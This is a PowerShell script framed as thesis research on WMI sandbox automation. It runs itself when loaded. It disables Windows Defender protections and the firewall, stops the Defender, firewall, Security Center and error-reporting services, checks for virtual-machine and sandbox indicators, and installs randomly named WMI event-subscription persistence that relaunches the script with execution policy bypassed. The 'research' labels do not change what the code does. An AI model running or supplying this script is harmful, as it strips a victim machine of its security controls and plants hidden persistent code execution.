# =============================================
# RESEARCH SCRIPT FOR THESIS - WMI SANDBOX AUTOMATION
# Author: [Your Name]
# Institution: [Your University] 
# Purpose: Academic Research Only
# =============================================

# Generate Random Letter for Evasion Study
function Get-RandomLetter {
    $letters = 'abcdefghijklmnopqrstuvwxyz'
    return $letters[(Get-Random -Maximum $letters.Length)]
}

# Disable Windows Security - FOR RESEARCH PURPOSES
function Disable-WindowsSecurity {
    Write-Host "[RESEARCH] Studying Windows Security Disablement Techniques..." -ForegroundColor Yellow
    
    try {
        # Windows Defender Disablement Study
        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisablePrivacyMode $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableArchiveScanning $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableIntrusionPreventionSystem $true -ErrorAction SilentlyContinue
        Set-MpPreference -DisableEmailScanning $true -ErrorAction SilentlyContinue
        
        # Disable Windows Firewall for Network Behavior Analysis
        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction SilentlyContinue
        
        Write-Host "[RESEARCH] Security controls disabled for behavioral analysis" -ForegroundColor Green
    }
    catch {
        Write-Host "[RESEARCH] Error in security disablement study: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Virtual Environment Detection for Sandbox Analysis
function Test-VirtualEnvironment {
    Write-Host "[RESEARCH] Analyzing Virtual Environment Indicators..." -ForegroundColor Yellow
    
    $sandboxIndicators = @()
    
    # Check common sandbox processes
    $sandboxProcesses = @("vmsrvc", "vboxtray", "vmtoolsd", "vmwaretray", "xenservice", "qemu-ga", "prl_cc", "prl_tools")
    $runningProcesses = Get-Process | Select-Object -ExpandProperty ProcessName
    
    foreach ($proc in $sandboxProcesses) {
        if ($runningProcesses -match $proc) {
            $sandboxIndicators += "Process: $proc"
        }
    }
    
    # Check WMI for virtual hardware
    try {
        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
        if ($computerSystem.Model -like "*Virtual*" -or $computerSystem.Manufacturer -like "*VMware*" -or $computerSystem.Manufacturer -like "*Microsoft*" -or $computerSystem.Manufacturer -like "*Xen*") {
            $sandboxIndicators += "WMI_Model: $($computerSystem.Model)"
        }
        
        $bios = Get-WmiObject -Class Win32_BIOS
        if ($bios.SerialNumber -like "*VMware*" -or $bios.Version -like "*VRTUAL*") {
            $sandboxIndicators += "BIOS: $($bios.SerialNumber)"
        }
    }
    catch {
        Write-Host "[RESEARCH] WMI query failed: $($_.Exception.Message)" -ForegroundColor Red
    }
    
    # Return findings for research data
    return $sandboxIndicators
}

# WMI-Based Persistence Mechanism Study
function Add-WMIPersistence {
    param([string]$ScriptPath)
    
    Write-Host "[RESEARCH] Studying WMI-Based Persistence Techniques..." -ForegroundColor Yellow
    
    try {
        # WMI Event Subscription for persistence research
        $EventFilterArgs = @{
            Name = "ResearchFilter_$(Get-RandomLetter)$(Get-Random -Minimum 1000 -Maximum 9999)"
            EventNameSpace = 'root\CimV2'
            Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"
        }
        
        $Filter = Set-WmiInstance -Namespace root\Subscription -Class __EventFilter -Arguments $EventFilterArgs -ErrorAction SilentlyContinue
        
        if ($Filter) {
            $CommandLineConsumerArgs = @{
                Name = "ResearchConsumer_$(Get-RandomLetter)$(Get-Random -Minimum 1000 -Maximum 9999)"
                CommandLineTemplate = "powershell.exe -ExecutionPolicy Bypass -File `"$ScriptPath`""
            }
            
            $Consumer = Set-WmiInstance -Namespace root\Subscription -Class CommandLineEventConsumer -Arguments $CommandLineConsumerArgs -ErrorAction SilentlyContinue
            
            $FilterToConsumerArgs = @{
                Filter = $Filter
                Consumer = $Consumer
            }
            
            $Binding = Set-WmiInstance -Namespace root\Subscription -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs -ErrorAction SilentlyContinue
            
            Write-Host "[RESEARCH] WMI persistence mechanism deployed for study" -ForegroundColor Green
            return $true
        }
    }
    catch {
        Write-Host "[RESEARCH] WMI persistence study failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# WMI-Based System Information Collection for Research
function Get-WMISystemInfo {
    Write-Host "[RESEARCH] Collecting System Information via WMI..." -ForegroundColor Yellow
    
    $systemInfo = @{}
    
    try {
        # Hardware Information
        $computerSystem = Get-WmiObject -Class Win32_ComputerSystem
        $systemInfo.Add("Manufacturer", $computerSystem.Manufacturer)
        $systemInfo.Add("Model", $computerSystem.Model)
        $systemInfo.Add("TotalMemory", "$([math]::Round($computerSystem.TotalPhysicalMemory / 1GB, 2)) GB")
        
        # Operating System Information
        $operatingSystem = Get-WmiObject -Class Win32_OperatingSystem
        $systemInfo.Add("OS", $operatingSystem.Caption)
        $systemInfo.Add("Version", $operatingSystem.Version)
        $systemInfo.Add("InstallDate", $operatingSystem.InstallDate)
        
        # Processor Information
        $processor = Get-WmiObject -Class Win32_Processor | Select-Object -First 1
        $systemInfo.Add("Processor", $processor.Name)
        $systemInfo.Add("Cores", $processor.NumberOfCores)
        
        # Disk Information
        $disks = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 }
        $diskInfo = @()
        foreach ($disk in $disks) {
            $diskInfo += "$($disk.DeviceID) $([math]::Round($disk.Size / 1GB, 2))GB"
        }
        $systemInfo.Add("Disks", ($diskInfo -join ", "))
        
        # Network Adapters
        $adapters = Get-WmiObject -Class Win32_NetworkAdapter | Where-Object { $_.NetEnabled -eq $true }
        $systemInfo.Add("NetworkAdapters", $adapters.Count)
        
        return $systemInfo
    }
    catch {
        Write-Host "[RESEARCH] WMI system info collection failed: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# WMI-Based Process Monitoring for Behavioral Analysis
function Start-WMIProcessMonitor {
    Write-Host "[RESEARCH] Starting WMI Process Monitoring..." -ForegroundColor Yellow
    
    try {
        # Create WMI event watcher for process creation
        $query = "SELECT * FROM Win32_ProcessStartTrace"
        $action = {
            $processName = $event.SourceEventArgs.NewEvent.ProcessName
            $processID = $event.SourceEventArgs.NewEvent.ProcessID
            $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            Write-Host "[PROCESS MONITOR] $timestamp - Process: $processName (PID: $processID)" -ForegroundColor Cyan
        }
        
        Register-WmiEvent -Query $query -Action $action -ErrorAction SilentlyContinue
        
        Write-Host "[RESEARCH] WMI process monitoring activated" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "[RESEARCH] WMI process monitoring failed: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# WMI-Based Service Control for Research
function Control-WMIServices {
    Write-Host "[RESEARCH] Studying WMI Service Control Mechanisms..." -ForegroundColor Yellow
    
    $servicesToStudy = @(
        @{Name="WinDefend"; Action="Stop"},
        @{Name="MpsSvc"; Action="Stop"},
        @{Name="wscsvc"; Action="Stop"},
        @{Name="WerSvc"; Action="Stop"}
    )
    
    foreach ($service in $servicesToStudy) {
        try {
            $wmiService = Get-WmiObject -Class Win32_Service -Filter "Name='$($service.Name)'"
            if ($wmiService) {
                if ($service.Action -eq "Stop" -and $wmiService.State -eq "Running") {
                    $result = $wmiService.StopService()
                    Write-Host "[RESEARCH] Service $($service.Name) stopped via WMI" -ForegroundColor Green
                }
            }
        }
        catch {
            Write-Host "[RESEARCH] Failed to control service $($service.Name): $($_.Exception.Message)" -ForegroundColor Red
        }
    }
}

# Main Research Execution Function
function Start-WMIResearch {
    Write-Host "=== WMI SANDBOX AUTOMATION RESEARCH ===" -ForegroundColor Magenta
    Write-Host "Starting comprehensive WMI behavior analysis..." -ForegroundColor Yellow
    
    # 1. Virtual Environment Detection
    $sandboxIndicators = Test-VirtualEnvironment
    if ($sandboxIndicators.Count -gt 0) {
        Write-Host "[RESEARCH] Virtual Environment Detected:" -ForegroundColor Red
        $sandboxIndicators | ForEach-Object { Write-Host "  - $_" -ForegroundColor Red }
    } else {
        Write-Host "[RESEARCH] No clear virtual environment indicators found" -ForegroundColor Green
    }
    
    # 2. System Information Collection via WMI
    $systemInfo = Get-WMISystemInfo
    if ($systemInfo) {
        Write-Host "[RESEARCH] System Information Collected:" -ForegroundColor Green
        $systemInfo.GetEnumerator() | ForEach-Object { Write-Host "  - $($_.Key): $($_.Value)" -ForegroundColor White }
    }
    
    # 3. Security Control Analysis
    Disable-WindowsSecurity
    
    # 4. WMI Service Control Study
    Control-WMIServices
    
    # 5. Process Monitoring Setup
    $monitoringStarted = Start-WMIProcessMonitor
    
    # 6. WMI Persistence Mechanism Research
    $scriptPath = $MyInvocation.MyCommand.Path
    if ($scriptPath) {
        $persistenceAdded = Add-WMIPersistence -ScriptPath $scriptPath
    }
    
    Write-Host "[RESEARCH] WMI Sandbox Automation Study Completed" -ForegroundColor Magenta
    Write-Host "Data collected for academic analysis..." -ForegroundColor Yellow
    
    # Keep monitoring for research purposes
    if ($monitoringStarted) {
        Write-Host "[RESEARCH] Process monitoring active. Press any key to stop..." -ForegroundColor Cyan
        $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
    }
}

# Execute Research
Start-WMIResearch